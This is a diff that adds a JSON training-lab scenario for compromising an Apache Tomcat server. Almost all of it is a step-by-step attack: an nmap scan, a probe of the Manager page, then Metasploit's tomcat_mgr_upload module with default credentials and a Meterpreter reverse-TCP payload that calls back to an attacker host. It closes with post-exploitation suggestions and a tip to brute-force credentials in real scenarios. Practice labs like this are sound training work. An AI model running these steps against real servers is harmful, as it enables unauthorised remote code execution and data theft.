@@ -1,0 +1,87 @@
+{
+  "id": "tomcat-upload",
+  "name": "Tomcat Manager Shell Upload",
+  "difficulty": "easy",
+  "container": "tomcat",
+  "ip": "172.20.0.19",
+  "port": 8080,
+  "short_description": "Upload a malicious WAR file to Tomcat Manager for remote code execution.",
+  "description": "Apache Tomcat's Manager application allows deploying web apps. If you have valid credentials (often defaults like tomcat/tomcat), you can upload a malicious WAR file that gives you a shell. This is a common attack against misconfigured Java servers.",
+  "steps": [
+    {
+      "title": "Scan Tomcat",
+      "command": "nmap -sV 172.20.0.19 -p 8080",
+      "explanation": "Verify Tomcat is running on port 8080.",
+      "expected": "8080/tcp open http Apache Tomcat"
+    },
+    {
+      "title": "Check for Manager interface",
+      "command": "curl -I http://172.20.0.19:8080/manager/html",
+      "explanation": "The Manager app is at /manager/html. It requires authentication.",
+      "expected": "401 Unauthorized (authentication required)"
+    },
+    {
+      "title": "Start Metasploit",
+      "command": "msfconsole -q",
+      "explanation": "We'll use Metasploit's Tomcat exploit."
+    },
+    {
+      "title": "Load the exploit",
+      "command": "use exploit/multi/http/tomcat_mgr_upload",
+      "explanation": "This module creates a WAR file with a payload and uploads it via the Manager."
+    },
+    {
+      "title": "Configure the target",
+      "command": "set RHOSTS 172.20.0.19",
+      "explanation": "Set the target IP."
+    },
+    {
+      "title": "Set the port",
+      "command": "set RPORT 8080",
+      "explanation": "Tomcat runs on 8080."
+    },
+    {
+      "title": "Set Manager credentials",
+      "command": "set HttpUsername tomcat",
+      "explanation": "Default Tomcat Manager username."
+    },
+    {
+      "title": "Set the password",
+      "command": "set HttpPassword tomcat",
+      "explanation": "Default password. In real scenarios, try common defaults or brute force."
+    },
+    {
+      "title": "Choose a payload",
+      "command": "set PAYLOAD java/meterpreter/reverse_tcp",
+      "explanation": "Use a Java Meterpreter payload for a powerful shell."
+    },
+    {
+      "title": "Set your listener IP",
+      "command": "set LHOST 172.20.0.5",
+      "explanation": "This is the Kali attack box IP where the shell connects back."
+    },
+    {
+      "title": "Execute the exploit",
+      "command": "run",
+      "explanation": "Metasploit creates a WAR, uploads it, triggers execution, and catches the shell.",
+      "expected": "[*] Meterpreter session 1 opened"
+    },
+    {
+      "title": "Explore with Meterpreter",
+      "command": "getuid",
+      "explanation": "Check what user you're running as.",
+      "expected": "Server username (probably tomcat or root)"
+    },
+    {
+      "title": "Get system info",
+      "command": "sysinfo",
+      "explanation": "See details about the compromised system."
+    }
+  ],
+  "success_criteria": "You have a Meterpreter session and can run commands on the Tomcat server.",
+  "next_steps": [
+    "Try 'shell' to drop into a system shell",
+    "Use 'upload' and 'download' to transfer files",
+    "Explore post/multi/gather modules"
+  ]
+}
